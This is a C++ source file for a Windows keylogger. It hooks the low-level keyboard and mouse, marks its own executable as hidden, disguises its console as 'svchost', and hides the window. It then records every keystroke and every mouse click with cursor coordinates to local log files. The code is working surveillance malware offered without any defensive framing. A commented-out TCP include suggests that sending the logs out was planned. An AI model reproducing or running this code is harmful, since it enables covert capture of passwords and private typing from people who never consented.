#include <iostream>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <chrono>
#include <iomanip>
#include <locale>

// #include "tcp_connection.h"

std::ofstream logFile, keyboardFile;
std::ostringstream logStream, keyboardStream;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
    char Exename[MAX_PATH] = "keyloger-in-cpp.exe";
    GetModuleFileNameA(nullptr, Exename, MAX_PATH);
    SetFileAttributesA(Exename, FILE_ATTRIBUTE_HIDDEN);
    SetConsoleTitleA("svchost");
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    logFile.open("log.csv", std::ios::app);
    logStream << "Time,Event,Type,Key/Position,MousePosition\n";
    logFile << logStream.str();
    logFile.close();

    keyboardFile.open("linear_keyboard.txt", std::ios::app);
    keyboardFile << "Every word typed by computer:\n";
    keyboardFile.close();

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, 0);

    MSG message;
    std::cout << "I am working now\nBut you don't need to look at terminal for real" << std::endl;
    std::cout << "If I had chance to do, I will hide that too" << std::endl;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        auto time_now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::system_clock::to_time_t(time_now);
        std::string key;

        switch (p->vkCode)
        {
        case VK_RETURN:
            key = " ( typed Enter )\n";
            break;
        case VK_SPACE:
            key = " ( typed Space ) ";
            break;
        case VK_SHIFT:
            key = " ( typed Shift ) ";
            break;
        case VK_BACK:
            key = " ( typed Backspace ) ";
            break;
        case VK_TAB:
            key = " ( typed Tab ) ";
            break;
        case VK_ESCAPE:
            key = " ( typed Escape ) ";
            break;
        case VK_CAPITAL:
            key = " ( typed Caps Lock ) ";
            break;
        case VK_LCONTROL:
        case VK_RCONTROL:
            key = " ( typed Control ) ";
            break;
        case VK_LMENU:
        case VK_RMENU:
            key = " ( typed Alt ) ";
            break;
        case VK_LWIN:
        case VK_RWIN:
            key = " ( typed Windows Key ) ";
            break;
        case VK_OEM_1:
            key = " ( typed ; ) ";
            break;
        case VK_OEM_2: 
            key = " ( typed ? ) ";
            break;
        case VK_OEM_3:
            key = " ( typed ~ ) ";
            break;
        case VK_OEM_4:
            key = " ( typed [ ) ";
            break;
        case VK_OEM_5:
            key = " ( typed | ) ";
            break;
        case VK_OEM_6:
            key = " ( typed ] ) ";
            break;
        case VK_OEM_7:
            key = " ( typed ' ) ";
            break;
        case VK_OEM_COMMA:
            key = " ( typed , ) ";
            break;
        case VK_OEM_PERIOD:
            key = " ( typed . ) ";
            break;
        case VK_OEM_MINUS:
            key = " ( typed - ) ";
            break;
        case VK_OEM_PLUS:
            key = " ( typed + ) ";
            break;
        case VK_OEM_8:
            key = " ( typed ` ) ";
            break;
        case VK_OEM_102:
            key = " ( typed < ) ";
            break;
        case VK_INSERT:
            key = " ( typed Insert ) ";
            break;
        case VK_DELETE:
            key = " ( typed Delete ) ";
            break;
        case VK_HOME:
            key = " ( typed Home ) ";
            break;
        case VK_END:
            key = " ( typed End ) ";
            break;
        case VK_PRIOR:
            key = " ( typed Page Up ) ";
            break;
        case VK_NEXT:
            key = " ( typed Page Down ) ";
            break;
        case VK_NUMPAD0:
        case VK_NUMPAD1:
        case VK_NUMPAD2:
        case VK_NUMPAD3:
        case VK_NUMPAD4:
        case VK_NUMPAD5:
        case VK_NUMPAD6:
        case VK_NUMPAD7:
        case VK_NUMPAD8:
        case VK_NUMPAD9:
            key = " ( typed Num Pad ";
            if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9) {
                key += static_cast<char>(p->vkCode - VK_NUMPAD0 + '0');
            }
            else {
                // For keys like VK_NUMPAD0 - VK_NUMPAD9, their virtual key codes correspond directly to ASCII values
                key += static_cast<char>(p->vkCode);
            }
            key += " ) ";
            break;
        case VK_MULTIPLY:
            key = " ( typed * ) ";
            break;
        case VK_ADD:
            key = " ( typed + ) ";
            break;
        case VK_SUBTRACT:
            key = " ( typed - ) ";
            break;
        case VK_DECIMAL:
            key = " ( typed . ) ";
            break;
        case VK_DIVIDE:
            key = " ( typed / ) ";
            break;
        case VK_F1:
        case VK_F2:
        case VK_F3:
        case VK_F4:
        case VK_F5:
        case VK_F6:
        case VK_F7:
        case VK_F8:
        case VK_F9:
        case VK_F10:
        case VK_F11:
        case VK_F12:
            key = " ( typed F";
            key += static_cast<char>(p->vkCode - VK_F1 + '1');
            key += " ) ";
            break;
        default:
            key = static_cast<char>(tolower(p->vkCode));
            break;
        }

        std::tm timeinfo;
        localtime_s(&timeinfo, &timestamp);
        if (timeinfo.tm_sec % 30 == 0) {
            keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":"
                << key;
        }
        else {
            keyboardStream << key;
        }

        char ptr = '0';

        //logStream << "Time,Event,Type,Key/Position,MousePosition\n";

        try
        {
            std::tm timeinfo;
            localtime_s(&timeinfo, &timestamp);

            // Log keyboard event to the log stream
            logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
                << "Keyboard Key,Pressed,"
                << key << ",0\n";

            // Append log stream to the log file
            logFile.open("log.csv", std::ios::app);
            if (!logFile.is_open()) {
                throw std::runtime_error("Failed to open log file.");
            }
            logFile << logStream.str();
            logFile.close();
            logStream.str("");

            // Append key to the keyboard file
            keyboardFile.open("linear_keyboard.txt", std::ios::app);
            if (!keyboardFile.is_open()) {
                throw std::runtime_error("Failed to open keyboard file.");
            }
            keyboardFile << key;
            keyboardFile.close();
            keyboardStream.str("");
        }
        catch (const std::exception&)
        {

        }
        /*
            // old code:

            logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ","
            << "Keyboard Key,Pressed,"
            << key <<"," << ptr << "\n";
            logFile.open("log.csv", std::ios::app);
            logFile << logStream.str();
            logFile.close();
            logStream.str("");
            localtime_s(&timeinfo, &timestamp);
            keyboardFile.open("linear_keyboard.txt", std::ios::app);
            keyboardFile << keyboardStream.str();
            keyboardFile.close();
            keyboardStream.str("");

        */
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
    {
        try {
            ULONGLONG time_now = GetTickCount64();
            POINT p;
            if (!GetCursorPos(&p)) {
                throw std::runtime_error("Failed to get cursor position.");
            }
            std::string button;
            switch (wParam)
            {
            case WM_LBUTTONDOWN:
                button = "Left";
                break;
            case WM_RBUTTONDOWN:
                button = "Right";
                break;
            case WM_MBUTTONDOWN:
                button = "Middle";
                break;
            default:
                button = "Unknown";
                break;
            }
            time_t timestamp = time(nullptr);
            struct tm localtime_buffer;
            localtime_s(&localtime_buffer, &timestamp);
            char time_str[20];
            if (!strftime(time_str, 20, "%Y-%m-%d %H:%M:%S", &localtime_buffer)) {
                throw std::runtime_error("Failed to format time.");
            }

            //logStream << "Time,Event,Type,Key/Position,MousePosition\n";
            logStream << time_str << "," << "Mouse Click" << ",Mouse," << button << "," << p.x << ":" << p.y << "\n";

            logFile.open("log.csv", std::ios::app);
            if (!logFile.is_open()) {
                throw std::runtime_error("Failed to open log file.");
            }
            logFile << logStream.str();
            logFile.close();
            logStream.str("");
        }
        catch (const std::exception& e) {
            // Handle error
            std::cerr << "Error: " << e.what() << std::endl;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
